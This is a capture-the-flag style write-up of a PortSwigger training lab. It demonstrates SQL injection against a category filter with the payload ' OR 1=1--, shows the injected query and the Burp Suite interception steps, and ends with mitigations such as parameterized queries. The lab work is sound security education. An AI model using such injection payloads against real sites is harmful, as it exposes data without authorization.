# Lab 01: SQL Injection — Hidden Data Retrieval

> **Lab URL:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)  
> **Difficulty:** 🟢 Apprentice  
> **Status:** ✅ Solved

---

## 📋 Lab Description

> *"This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:*
> ```sql
> SELECT * FROM products WHERE category = 'Gifts' AND released = 1
> ```
> *To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products."*

---

## 🔍 Reconnaissance

### Step 1: Identify the Injection Point
The application has a product category filter. Clicking different categories changes the URL:

```
https://<lab-id>.web-security-academy.net/filter?category=Gifts
```

The `category` parameter is directly passed to the backend SQL query.

### Step 2: Test for SQL Injection
I tested the parameter with a single quote to see if the query breaks:

```
/filter?category=Gifts'
```

**Result:** Internal Server Error (500) — confirms SQL syntax error, indicating the input is directly concatenated into the query.

---

## 🚀 Exploitation

### Payload Used
```
' OR '1'='1'--
```

### Full URL
```
https://<lab-id>.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories'+OR+1=1--
```

### What Happens?

**Original Query:**
```sql
SELECT * FROM products 
WHERE category = 'Clothing, shoes and accessories' AND released = 1
```

**Injected Query:**
```sql
SELECT * FROM products 
WHERE category = 'Clothing, shoes and accessories' OR '1'='1'--' AND released = 1
```

**Breakdown:**
- `'` — closes the original string literal
- `OR '1'='1'` — adds a condition that is always TRUE
- `--` — comments out the rest of the query (`AND released = 1`)

**Result:** The query returns **ALL products**, including those where `released = 0` (unreleased/hidden products).

---

## 📸 Proof of Concept

## 🛠️ Burp Suite Intercept

I used **Burp Suite** to intercept and modify the HTTP request before sending it to the server.

### Steps:
1. Configured Firefox proxy to route through Burp Suite (127.0.0.1:8080)
2. Turned on **Intercept** in Burp Suite Proxy tab
3. Clicked on a category in the web application to capture the request
4. Modified the intercepted `category` parameter to inject the SQL payload
5. Forwarded the modified request to the server

---

### 📸 Before Modification (Original Request)

<img width="2560" height="1368" alt="Screenshot 2026-08-13 002414" src="https://github.com/user-attachments/assets/aa0223e1-4408-42ca-b178-bf2b9979d06d" />


&gt; **Original Request:** `GET /filter?category=Clothing%2c+shoes+and+accessories`  
&gt; The application sends a normal request with the selected category. No payload injected yet.

---

### 📸 After Modification (Injected Payload)

<img width="2560" height="1368" alt="Screenshot 2026-08-13 004845" src="https://github.com/user-attachments/assets/c8228e3b-fc09-4fc7-bff6-8686dfc6bedc" />


&gt; **Modified Request:** `GET /filter?category=Clothing%2c+shoes+and+accessories'+OR+1=1--`  
&gt; The payload `' OR 1=1--` was injected into the `category` parameter.  
&gt; This manipulates the SQL query to always evaluate as TRUE, revealing hidden data.

---

### 🔍 What Changed?

| Before | After |
|--------|-------|
| `category=Clothing...` | `category=Clothing...'+OR+1=1--` |
| Normal query execution | SQL query bypassed |
| Only released products shown | **All products (including hidden) revealed** |


### After Injection
<img width="2560" height="1368" alt="Screenshot 2026-08-13 002626" src="https://github.com/user-attachments/assets/1799f7de-10d0-4033-9a91-8014118ece3a" />

As seen in the screenshot:
- The payload `' OR 1=1--` was injected into the category parameter
- The page now displays **all categories** 
- Hidden/unreleased products are now visible
- Lab shows **"Congratulations, you solved the lab!"**

---

## 🧠 Key Takeaways

### 1. Vulnerability Root Cause
The application constructs SQL queries using **string concatenation** instead of **parameterized queries**.

### 2. Impact
- **Information Disclosure:** Unauthorized access to hidden/unreleased data
- **Data Integrity:** Potential to modify or delete data with more advanced payloads
- **Reputation Risk:** Unreleased products exposed before official launch

### 3. Mitigation Strategies
| Defense | Implementation |
|---------|---------------|
| **Parameterized Queries** | Use prepared statements (`?` placeholders) |
| **Input Validation** | Whitelist allowed characters; reject suspicious input |
| **ORM Frameworks** | Use ORMs that automatically handle query construction |
| **WAF Rules** | Deploy Web Application Firewall with SQLi detection |
| **Least Privilege** | Database accounts should have minimal required permissions |

### 4. Why This Matters for AppSec
Understanding SQL Injection is fundamental because:
- It's #3 in the [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- It appears in **74% of web applications** during penetration tests
- It's often the entry point for more severe attacks (data exfiltration, RCE)

---

## 📚 References

- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

## 🔗 Related Labs

| Lab | Topic | Status |
|-----|-------|--------|
| [Lab 02](../02-login-bypass) | SQL Injection — Login Bypass | 🔄 In Progress |
| [Lab 03](../03-union-attack) | SQL Injection — UNION Attack | ⏳ Pending |

---

> 📝 **Author:** Saber Hasan Swoyon    
> 📅 **Date Solved:** 2026-08-13
